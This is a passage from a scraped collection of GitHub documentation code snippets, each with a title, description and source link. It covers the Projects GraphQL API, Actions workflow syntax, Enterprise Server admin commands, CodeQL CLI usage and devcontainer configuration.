\"read:project\"` is required.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n  query{\n    organization(login: \"ORGANIZATION\"){\n      projectV2(number: NUMBER) {\n        id\n      }\n    }\n  }'\n```\n\n----------------------------------------\n\nTITLE: Tool Tag: WebUI\nDESCRIPTION: This code snippet demonstrates how to use the `webui` tag to display content relevant to GitHub UI users. It wraps instructions specific to the GitHub UI.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_20\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% webui %}\n\nThese instructions are pertinent to GitHub UI users.\n\n{% endwebui %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Forwarding Webhooks using Smee.io\nDESCRIPTION: This snippet shows how to use Smee.io to forward webhooks from GitHub to your local development server. Replace `WEBHOOK_PROXY_URL` with the actual URL provided by Smee.io. This command establishes a connection to receive webhook events.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/quickstart.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nnpx smee -u WEBHOOK_PROXY_URL -t http://localhost:3000/api/webhook\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on discussion events\nDESCRIPTION: This code snippet shows how to trigger a GitHub Actions workflow when a discussion is created, edited, or answered in a repository.  The `on` keyword specifies the `discussion` event, and the `types` keyword filters for specific activity types: `created`, `edited`, and `answered`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  discussion:\n    types: [created, edited, answered]\n```\n\n----------------------------------------\n\nTITLE: Example Redirect URL with code parameter\nDESCRIPTION: This code snippet shows an example of a redirect URL that {% data variables.product.prodname_dotcom %} redirects to after a person clicks \"Create {% data variables.product.prodname_github_app %}\". The `code` parameter contains a temporary code that will be exchanged for the app configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/sharing-github-apps/registering-a-github-app-from-a-manifest.md#_snippet_4\n\nLANGUAGE: URL\nCODE:\n```\nhttps://example.com/redirect?code=a180b1a3d263c81bc6441d7b990bae27d4c10679\n```\n\n----------------------------------------\n\nTITLE: Yarn Classic yarn.lock Configuration\nDESCRIPTION: This snippet shows an example entry in `yarn.lock` with the private registry URL. This is required to ensure Yarn Classic pulls dependencies from the intended private registry after running `yarn install`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nencoding@^0.1.11:\n  version \"0.1.13\"\n  resolved \"https://private_registry_url/encoding/-/encoding-0.1.13.tgz#56574afdd791f54a8e9b2785c0582a2d26210fa9\"\n  integrity sha512-ETBauow1T35Y/WZMkio9jiM0Z5xjHHmJ4XmjZOq1l/dXz3lr2sRn87nJy20RupqSh1F2m3HHPSp8ShIPQJrJ3A==\n  dependencies:\n    iconv-lite \"^0.6.2\"\n```\n\n----------------------------------------\n\nTITLE: Querying Enterprise ID with GraphQL\nDESCRIPTION: This GraphQL query retrieves the ID of a specified enterprise. It takes the enterprise slug as input and returns the slug and ID of the enterprise. This is used to identify the target enterprise for organization migration.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-organizations-from-githubcom-to-github-enterprise-cloud.md#_snippet_0\n\nLANGUAGE: GraphQL\nCODE:\n```\nquery(\n  $slug: String!\n){\n  enterprise (slug: $slug)\n  {\n    slug\n    id\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Featured Links - YAML\nDESCRIPTION: This snippet shows how to use the `featuredLinks` frontmatter property to render linked articles' titles and intros on product landing pages and the homepage. It demonstrates how to customize the 'Popular' heading.\nSOURCE: https://github.com/github/docs/blob/main/content/README.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nfeaturedLinks:\n  gettingStarted:\n    - /path/to/page\n  startHere:\n    - /guides/example\n  popular:\n    - /path/to/popular/article1\n    - /path/to/popular/article2\n  popularHeading: An alternate heading to Popular\n```\n\n----------------------------------------\n\nTITLE: Changing Directory\nDESCRIPTION: Changes the current working directory to the cloned repository. Replace `REPOSITORY-NAME` with the name of the cloned repository.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/splitting-a-subfolder-out-into-a-new-repository.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ncd REPOSITORY-NAME\n```\n\n----------------------------------------\n\nTITLE: Dry run with source file path\nDESCRIPTION: This command performs a dry run of the CircleCI to GitHub Actions migration, using a specified source file path instead of fetching the pipeline configuration from source control. It requires the `gh actions-importer` tool. The output will be saved in the specified directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run circle-ci --output-dir ./output/ --source-file-path ./path/to/.circleci/config.yml\n```\n\n----------------------------------------\n\nTITLE: Auditing Successfully Imported Organizations and Teams\nDESCRIPTION: This command uses `ghe-migrator audit` to view successfully imported organization and team records. It requires the Migration GUID. The command filters for `organization` and `team` record types and `mapped` and `renamed` states.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-migrator audit -m organization,team -s mapped,renamed -g MIGRATION-GUID\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering of Container Registry Hostname - Liquid\nDESCRIPTION: This Liquid snippet conditionally renders the container registry hostname based on the GitHub product version. It checks for `fpt`, `ghec`, and `ghes` versions and outputs the corresponding hostname.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/package_registry/container-registry-hostname.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghec %}ghcr.io{% elsif ghes %}containers.HOSTNAME{% else %}{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Configure Amazon S3 Storage\nDESCRIPTION: This command configures Amazon S3 as the storage provider for GitHub Actions. It uses the `ghe-config` tool to set the `secrets.actions.storage.blob-provider` configuration to \"s3\". This command requires the `ghe-config` tool to be available in the environment.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/configure-storage-provider-platform-commands.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.blob-provider \"s3\"\n```\n\n----------------------------------------\n\nTITLE: qlpack.yml - Defining Pack Dependencies (YAML)\nDESCRIPTION: This YAML snippet shows how to define the `dependencies` property in a `qlpack.yml` file. This property is required by query and library packs that define CodeQL package dependencies on other packs. Model packs should use `extensionTargets` instead.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_9\n\nLANGUAGE: YAML\nCODE:\n```\ndependencies:\n  codeql/cpp-all: ^0.0.2\n```\n\n----------------------------------------\n\nTITLE: Adding a Task List using Markdown\nDESCRIPTION: This snippet demonstrates how to add a task list to a GitHub issue using Markdown.  Each list item is prefaced with `[ ]` to create a checkbox. Existing issues can be referenced by issue number or URL.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/configuring-issues/quickstart.md#_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n[ ] Task 1\n[ ] Task 2\n[ ] Task 3 #123\n```\n\n----------------------------------------\n\nTITLE: Update Subversion Trunk\nDESCRIPTION: This snippet updates the `trunk` branch in a Subversion checkout. The Subversion bridge maps `trunk` to the Git `HEAD` branch. This command downloads the files present in the trunk branch, making them available in the local working directory. Requires an existing svn checkout.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/working-with-subversion-on-github/support-for-subversion-clients.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ svn up trunk\n> A    trunk\n> A    trunk/README.md\n> A    trunk/gizmo.rb\n> Updated to revision 1.\n```\n\n----------------------------------------\n\nTITLE: Creating a Relative Link in Markdown\nDESCRIPTION: This Markdown snippet demonstrates how to create a relative link to another file within the same repository. The link text is enclosed in square brackets, and the relative path to the target file is enclosed in parentheses.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/repositories/relative-links.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n[Contribution guidelines for this project](docs/CONTRIBUTING.md)\n```\n\n----------------------------------------\n\nTITLE: GitLab CI/CD Job Dependency Syntax\nDESCRIPTION: This YAML snippet shows how to define job dependencies in GitLab CI/CD using stages.  `build_a` and `build_b` run in parallel in the `build` stage. `test_ab` runs after both `build_a` and `build_b` have finished in the `test` stage. `deploy_ab` runs in the `deploy` stage after `test_ab` completes.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nstages:\n  - build\n  - test\n  - deploy\n\nbuild_a:\n  stage: build\n  script:\n    - echo \"This job will run first.\"\n\nbuild_b:\n  stage: build\n  script:\n    - echo \"This job will run first, in parallel with build_a.\"\n\ntest_ab:\n  stage: test\n  script:\n    - echo \"This job will run after build_a and build_b have finished.\"\n\ndeploy_ab:\n  stage: deploy\n  script:\n    - echo \"This job will run after test_ab is complete\"\n```\n\n----------------------------------------\n\nTITLE: Defining the Manage GitHub Enterprise Server API URL prefix\nDESCRIPTION: This snippet defines the URL prefix for the Manage GitHub Enterprise Server API and Management Console API. It uses the hostname and administration port of the server.  Access to these endpoints requires authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/enterprise-admin/index.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nhttp(s)://HOSTNAME:ADMINISTRATION-PORT/\n```\n\n----------------------------------------\n\nTITLE: Garbage Collection\nDESCRIPTION: This command runs garbage collection on a repository, removing unreferenced commits. The `-v` flag enables verbose output, and `--prune` removes unreferenced objects. OWNER/REPOSITORY must be replaced by the actual owner and repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\nghe-repo-gc -v --prune OWNER/REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: Unblocking a Specific IP Address on a Cluster Node (ghe-cluster-unblock-ip)\nDESCRIPTION: This command unblocks a specific IPv4 address on a specified node within the cluster. It reverses the effect of `ghe-cluster-block-ip`, allowing traffic from the previously blocked address to reach the node. The command takes the IPv4 address as input.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_43\n\nLANGUAGE: shell\nCODE:\n```\nghe-cluster-unblock-ip IPV4 ADDRESS\n```\n\n----------------------------------------\n\nTITLE: qlpack.yml - Defining Default Suite (YAML)\nDESCRIPTION: This YAML snippet shows how to define the `defaultSuite` property in a `qlpack.yml` file. This property is required by packs that export a set of default queries to run. It defines an inlined query suite containing all of the queries that are run by default.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_11\n\nLANGUAGE: YAML\nCODE:\n```\ndefaultSuite:\n  queries: .\n  exclude:\n    precision: medium\n```\n\n----------------------------------------\n\nTITLE: Exporting GPG Public Key\nDESCRIPTION: This command exports the GPG public key in ASCII armor format, allowing it to be added to a GitHub account. The key ID should be substituted with the user's specific GPG key ID. The `--export-options export-minimal` flag prevents issues with deprecated fields.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/checking-for-existing-gpg-keys.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ gpg --armor --export 3AA5C34371567BD2\n# Prints the GPG public key, in ASCII armor format\n```\n\n----------------------------------------\n\nTITLE: CodeQL Database Import Synopsis (Shell)\nDESCRIPTION: Displays the command-line synopsis for `codeql database import`.  It shows the structure of the command including the required parameters: `<database>` which specifies the target database and `<additionalDbs>` which specifies the source databases to import from. The synopsis also includes a list of available options.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-import.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database import [--dbscheme=<file>] [--threads=<num>] [--ram=<MB>] <options>... -- <database> <additionalDbs>...\n```\n\n----------------------------------------\n\nTITLE: Example Dependency Graph\nDESCRIPTION: This code snippet illustrates a dependency graph example where a project depends on package A, which in turn depends on package B. This example is used to explain a scenario where Dependabot tries to update transitive dependencies due to security vulnerabilities.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/troubleshooting-dependabot/troubleshooting-dependabot-errors.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nmy project\n|\n--> A (2.0.0) [~2.0.0]\n       |\n       --> B (1.0.1) [~1.0.0]\n```\n\n----------------------------------------\n\nTITLE: Getting Raw Payload Request (Ruby)\nDESCRIPTION: This helper method retrieves the raw payload from the request body and converts it to JSON format. It rewinds the request body to ensure it can be read and handles potential JSON parsing errors.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_51\n\nLANGUAGE: Ruby\nCODE:\n```\n    # Saves the raw payload and converts the payload to JSON format\n    def get_payload_request(request)\n      # request.body is an IO or StringIO object\n      # Rewind in case someone already read it\n      request.body.rewind\n      # The raw text of the body is required for webhook signature verification\n      @payload_raw = request.body.read\n      begin\n        @payload = JSON.parse @payload_raw\n      rescue => e\n        fail 'Invalid JSON (#{e}): #{@payload_raw}'\n      end\n    end\n```\n\n----------------------------------------\n\nTITLE: Fetch Git Branch After SVN Branch Creation\nDESCRIPTION: This snippet fetches new branches from the remote Git repository. It confirms the creation of a new branch in Git after it was created in Subversion using `svn copy`. Requires `git` to be installed and configured to interact with the remote repository.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/working-with-subversion-on-github/support-for-subversion-clients.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n$ git fetch\n> From https://github.com/USER/REPO/\n> * [new branch]    more_awesome -> origin/more_awesome\n```\n\n----------------------------------------\n\nTITLE: Enabling GitHub Copilot in Vim/Neovim\nDESCRIPTION: This command activates GitHub Copilot in Vim or Neovim.  It enables Copilot's features, such as code suggestions and autocompletion.  The command assumes that Copilot has already been installed and initially configured using the setup command.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/copilot/config-enable-copilot-in-vimneovim.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n:Copilot enable\n```\n\n----------------------------------------\n\nTITLE: Starting Runner Service - Windows\nDESCRIPTION: Starts the self-hosted runner service on Windows using PowerShell. Requires the `actions.runner.*` service name. The service name is stored in `service_win_name` variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\nStart-Service \"{{ service_win_name }}\"\n```\n\n----------------------------------------\n\nTITLE: Initializing Sinatra App Settings in Ruby\nDESCRIPTION: This code initializes the Sinatra application by setting the port to 3000 and binding it to '0.0.0.0'. It configures the server to listen on all available network interfaces, making it accessible from outside the local machine. This is crucial for receiving webhook events from GitHub.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\n  # Sets the port that's used when starting the web server.\n  set :port, 3000\n  set :bind, '0.0.0.0'\n```\n\n----------------------------------------\n\nTITLE: Defining Docker Container Arguments in YAML\nDESCRIPTION: This snippet demonstrates how to define arguments passed to a Docker container when using a GitHub Action. The `args` section specifies a list of arguments, including references to input variables (like `inputs.greeting`) and static values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\nruns:\n  using: 'docker'\n  image: 'Dockerfile'\n  args:\n    - ${{ inputs.greeting }}\n    - 'foo'\n    - 'bar'\n```\n\n----------------------------------------\n\nTITLE: Example Interactive Rebase Commit List\nDESCRIPTION: This is an example of the output from the `git rebase -i` command.  It shows the list of commits that will be rebased, along with instructions on how to modify the rebase plan.  The commands `pick`, `reword`, `edit`, etc. are described in the comments.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/creating-and-editing-commits/changing-a-commit-message.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\npick e499d89 Delete CNAME\npick 0c39034 Better README\npick f7fde4a Change the commit message but push the same commit.\n\n# Rebase 9fdb3bd..f7fde4a onto 9fdb3bd\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\n----------------------------------------\n\nTITLE: Final devcontainer.json configuration\nDESCRIPTION: This JSON configuration showcases the final `devcontainer.json` setup, incorporating a `postCreateCommand` to automatically install dependencies using `npm install` and configuring VS Code to install the 'streetsidesoftware.code-spell-checker' extension. The configuration customizes the development environment to ensure dependencies are installed and a specific VS Code extension is available upon codespace creation. It builds upon the initial configuration by adding automated dependency installation and extension management.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-nodejs-project-for-codespaces.md#_snippet_3\n\nLANGUAGE: jsonc\nCODE:\n```\n// README at: https://github.com/devcontainers/templates/tree/main/src/javascript-node\n{\n  \"name\": \"Node.js\",\n  // Or use a Dockerfile or Docker Compose file. More info: https://containers.dev/guide/dockerfile\n  \"image\": \"mcr.microsoft.com/devcontainers/javascript-node:0-18-bullseye\",\n  \"features\": {\n    \"ghcr.io/devcontainers-contrib/features/jshint:2\": {}\n  },\n\n  // Use 'forwardPorts' to make a list of ports inside the container available locally.\n  // \"forwardPorts\": [],\n\n  // Use 'postCreateCommand' to run commands after the container is created.\n  \"postCreateCommand\": \"npm install\",\n\n  // Configure tool-specific properties.\n  \"customizations\": {\n    // Configure properties specific to VS Code.\n    \"vscode\": {\n      // Add the IDs of extensions you want installed when the container is created.\n      \"extensions\": [\n        \"streetsidesoftware.code-spell-checker\"\n      ]\n    }\n  }\n\n  // Uncomment to connect as root instead. More info: https://aka.ms/dev-containers-non-root.\n  // \"remoteUser\": \"root\"\n}\n```\n\n----------------------------------------\n\nTITLE: Executing GHES Upgrade\nDESCRIPTION: This snippet demonstrates how to execute the `ghe-upgrade` command to upgrade GitHub Enterprise Server using an upgrade package. It takes the package filename as an argument. The package signature is verified, and the installation prompts for confirmation.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/upgrading-your-instance/performing-an-upgrade/upgrading-with-an-upgrade-package.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nadmin@HOSTNAME:~$ ghe-upgrade GITHUB-UPGRADE.pkg\n*** verifying upgrade package signature...\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering (GHES > 2.13) - Liquid\nDESCRIPTION: This snippet demonstrates conditional rendering using the `ifversion` tag. It checks if the GitHub Enterprise Server (GHES) version is greater than 2.13 and if the product is not FPT. If both conditions are true, it renders 'Alpha'.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/and-greater-than1.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion not fpt and ghes > 2.13 %}\n\nAlpha\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Creating Codespace with Idle Timeout using GitHub CLI\nDESCRIPTION: This command creates a new GitHub Codespace and sets its idle timeout to 90 minutes. The `idle-timeout` argument specifies the duration of inactivity before the codespace automatically stops. It requires the GitHub CLI to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-your-user-preferences/setting-your-timeout-period-for-github-codespaces.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace create --idle-timeout 90m\n```\n\n----------------------------------------\n\nTITLE: Configuring Jekyll Site in YAML (_config.yml)\nDESCRIPTION: This YAML code snippet shows example configuration settings for a Jekyll site, including the domain, URL, and base URL. This is required for relative paths when the repository is hosted in a subdirectory.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\ndomain: my-site.github.io       # if you want to force HTTPS, specify the domain without the http at the start, e.g. example.com\nurl: https://my-site.github.io  # the base hostname and protocol for your site, e.g. http://example.com\nbaseurl: /REPOSITORY-NAME/      # place folder name if the site is served in a subfolder\n```\n\n----------------------------------------\n\nTITLE: Complete devcontainer.json with CUDA Feature\nDESCRIPTION: This snippet demonstrates a complete `.devcontainer/devcontainer.json` file including customizations for VS Code extensions (Python and Jupyter) and the NVIDIA CUDA feature configuration. The `features` object enables the installation of CUDA with cuDNN.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/getting-started-with-github-codespaces-for-machine-learning.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"customizations\": {\n    \"vscode\": {\n      \"extensions\": [\n        \"ms-python.python\",\n        \"ms-toolsai.jupyter\"\n      ]\n    }\n  },\n  \"features\": {\n    \"ghcr.io/devcontainers/features/nvidia-cuda:1\": {\n      \"installCudnn\": true\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Run Vitest with External Server\nDESCRIPTION: Runs vitest tests without starting a server. This assumes that the server is already running externally. Prevents `vitest` from attempting to start a server on port 4000, which could cause conflicts during debugging or when a server is already running.\nSOURCE: https://github.com/github/docs/blob/main/src/tests/README.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nSTART_VITEST_SERVER=false vitests src/versions/tests\n```\n\n----------------------------------------\n\nTITLE: Linking to a header in the same article - Markdown\nDESCRIPTION: This code snippet demonstrates how to create a link to a specific header within the same Markdown article. It uses the `#HEADER-TITLE` format to reference the desired section. Ensure that the header title is properly formatted with hyphens instead of spaces.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_21\n\nLANGUAGE: Markdown\nCODE:\n```\nFor more information, see [HEADER TITLE](#HEADER-TITLE), later in this article.\n```\n\n----------------------------------------\n\nTITLE: Markdown Table with Row Headers\nDESCRIPTION: This code snippet demonstrates a Markdown table with row headers, wrapped in Liquid tags `{% rowheaders %} {% endrowheaders %}`. This indicates that the first column contains headers for the table rows.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_22\n\nLANGUAGE: markdown\nCODE:\n```\n{% raw %}{% rowheaders %}\n\n|             | Mona | Tom    | Hobbes |\n|-------------|------|--------|--------|\n|Type of cat  | Octo | Tuxedo | Tiger  |\n|Likes to swim| Yes  | No     | No     |\n\n{% endrowheaders %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Accessing Forwarded Port with curl\nDESCRIPTION: This snippet demonstrates how to use curl to access a forwarded port, requiring the address of the port and a GitHub token for authentication.  It uses the `-H` flag to set the `X-Github-Token` header. Replace `ADDRESS` and `TOKEN` with their respective values.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/codespaces/using-tools-to-access-ports-2.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncurl ADDRESS -H \"X-Github-Token: TOKEN\"\n```\n\n----------------------------------------\n\nTITLE: Creating a CodeQL Database with Build Command\nDESCRIPTION: This command creates a CodeQL database while specifying a build command. This is recommended for compiled languages. The `<database>` argument specifies the path to the new database. The `--command` option specifies the build command to be executed. The `--language` option specifies the language being analyzed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database create <database> --command <build> \\\n         --language=<language-identifier>\n```\n\n----------------------------------------\n\nTITLE: Conditional Table Row within List\nDESCRIPTION: This snippet showcases embedding a table inside a list, and conditionally rendering a table row based on the `volvo` version. The table structure is defined, and then a row containing Cargo and Rust information is conditionally inserted.\nSOURCE: https://github.com/github/docs/blob/main/src/content-linter/tests/fixtures/tables.md#_snippet_2\n\nLANGUAGE: Markdown\nCODE:\n```\n1. This is a list with a table\n   | Package manager | Languages | Recommended formats | All supported formats |\n   | --- | --- | --- | ---|\n   | {%- ifversion volvo %}  |\n   | Cargo | Rust | `Cargo.lock` | `Cargo.toml`, `Cargo.lock` |\n   | {%- endif %}  |\n```\n\n----------------------------------------\n\nTITLE: Specifying Multiple Queries in a Directory (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to recursively scan a directory for `.ql` files and include them in a CodeQL query suite. The path to the subdirectory is specified relative to the root of the CodeQL pack. The queries instruction tells CodeQL to find the `.ql` files inside the directory.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n- queries: <path-to-subdirectory>\n```\n\n----------------------------------------\n\nTITLE: Shell Command with Raw Processing\nDESCRIPTION: This shell script snippet includes curly braces that need to be rendered. It wraps the section in <code>&#123;% raw %&#125;</code> <code>&#123;% endraw %&#125;</code> to disable Liquid processing for that section, ensuring that the curly braces are rendered correctly in the output.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\nGITHUB_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Resulting Workflow Step from Build Step Transformer (YAML)\nDESCRIPTION: This YAML code represents the resulting GitHub Actions workflow step after applying the custom transformer defined in the previous Ruby snippet. It shows the conversion of the `buildJavaScriptApp` identifier to a workflow step that runs the specified `npm` commands.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/extending-github-actions-importer-with-custom-transformers.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n- name: build javascript app\n  run: |\n    npm run build\n    npm run package\n    npm run deploy\n```\n\n----------------------------------------\n\nTITLE: Installing gh-webhook extension using GitHub CLI\nDESCRIPTION: This command installs the `cli/gh-webhook` extension, enabling webhook forwarding functionality within the GitHub CLI. The extension is required to use the `webhook forward` subcommand. No specific input is required beyond running the command within a terminal where the GitHub CLI is configured.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/testing-and-troubleshooting-webhooks/using-the-github-cli-to-forward-webhooks-for-testing.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh extension install cli/gh-webhook\n```\n\n----------------------------------------\n\nTITLE: HTTPS Cloning Error: Not Found\nDESCRIPTION: Presents an error message indicating that the repository information could not be found, often due to server-side configuration issues or incorrect repository URL. The error suggests checking if `git update-server-info` was run on the server.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/troubleshooting-cloning-errors.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n> Error: https://{% data variables.product.product_url %}/USER/REPO.git/info/refs not found: did you run git\n> update-server-info on the server?\n```\n\n----------------------------------------\n\nTITLE: Searching by Account Information\nDESCRIPTION: This example demonstrates how to search users by account name (`user:` or `org:` qualifiers), or filter search to the username, full name or email with the `in:` qualifier. When the `in:` qualifier is omitted, the search will only be performed on the username and email address.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-users.md#_snippet_1\n\nLANGUAGE: none\nCODE:\n```\nuser:octocat\norg:electron type:user\nkenya in:login\nbolton in:name\nfullname:nat friedman\ndata in:email\n```\n\n----------------------------------------\n\nTITLE: Building and Testing Code\nDESCRIPTION: This workflow builds and tests a Go project.  It checks out the code, sets up Go ('1.21.x'), installs dependencies, builds the project using `go build`, and tests the code using `go test`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-go.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\nname: Go\non: [push]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Setup Go\n        uses: {% data reusables.actions.action-setup-go %}\n        with:\n          go-version: '1.21.x'\n      - name: Install dependencies\n        run: go get .\n      - name: Build\n        run: go build -v ./...\n      - name: Test with the Go CLI\n        run: go test\n```\n\n----------------------------------------\n\nTITLE: Removing a node from a cluster without evacuating data (ghe-remove-node)\nDESCRIPTION: This command removes a node from the GitHub Enterprise Server cluster without evacuating data. This is useful in emergency situations where a node has failed and data evacuation is not possible. NODE-HOSTNAME should be replaced with the actual hostname of the node to be removed.\nSOURCE: 